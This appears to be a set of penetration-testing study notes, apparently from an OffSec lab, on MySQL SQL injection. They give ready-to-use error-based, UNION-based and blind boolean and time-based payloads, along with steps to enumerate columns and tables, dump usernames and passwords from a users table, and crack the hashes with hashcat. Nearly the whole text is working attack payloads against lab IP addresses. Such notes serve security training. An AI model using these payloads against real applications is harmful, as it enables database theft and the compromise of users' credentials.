```bash

SELECT @@version;
```

```bash

# +--------+-----------------------+
# | user   | plugin                |
# +--------+-----------------------+
# | offsec | caching_sha2_password |

# Crack with hashcat:
# SHA256 based -> hashcat mode 7401

```

```bash
# Step 1: Try a valid username with an invalid password - nothing useful returned.

# Step 2: Append a single quote to the username field to test for SQL interaction:

# If an SQL syntax error is returned, the field is injectable.

# Step 3: Try error-based payloads:
' or 1=1 in (select @@version) -- //
```

## Error-Based Enumeration

```bash
# Dump version
' or 1=1 in (select @@version) -- //

# Attempt to dump users table (may error if multiple columns)
' OR 1=1 in (SELECT * FROM users) -- //
# Error: Operand should contain 1 column(s) -> query one column at a time

# Dump password column only
' or 1=1 in (SELECT password FROM users) -- //

# Dump password for a specific user
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

## UNION-Based Enumeration

```bash
# UNION SQLi requires:
# 1. Same number of columns as the original query
# 2. Compatible data types between columns

# Example vulnerable query:
# SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'

# Step 1: Determine number of columns using ORDER BY
' ORDER BY 1-- //
' ORDER BY 2-- //
# Keep incrementing until an error occurs.
# If ORDER BY 6 errors, there are 5 columns.

# Step 2: Identify which columns are displayed
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
# NOTE: Column 1 (a1) is typically an integer ID field and cannot return strings.
# Usable columns usually start at a2.

# Step 3: Enumerate database name, user, and version
%' UNION SELECT database(), user(), @@version, null, null -- //
# If nothing appears in first position, shift right:
' UNION SELECT null, null, database(), user(), @@version  -- //

# Step 4: Enumerate tables and columns in the current database
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
# Returns table names and their columns.
# Example: users table has columns: username, password, description

# Step 5: Dump the discovered table
' UNION SELECT null, username, password, description, null FROM users -- //
```

## Blind SQL Injection

```bash
# Database responses are never returned directly.
# Behavior is inferred using boolean or time-based logic.

# Step 1: Test if a user exists via URL parameter
http://192.168.183.16/blindsqli.php?user=offsec

# Step 2: Test boolean-based SQLi
http://192.168.183.16/blindsqli.php?user=offsec%27%20AND%201=1%20--%20//
# ?user=offsec' AND 1=1 -- //
# If the page loads normally -> TRUE condition confirmed -> injectable

# Step 3: Time-based SQLi
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
# If the page delays 3 seconds -> TRUE -> injectable
```
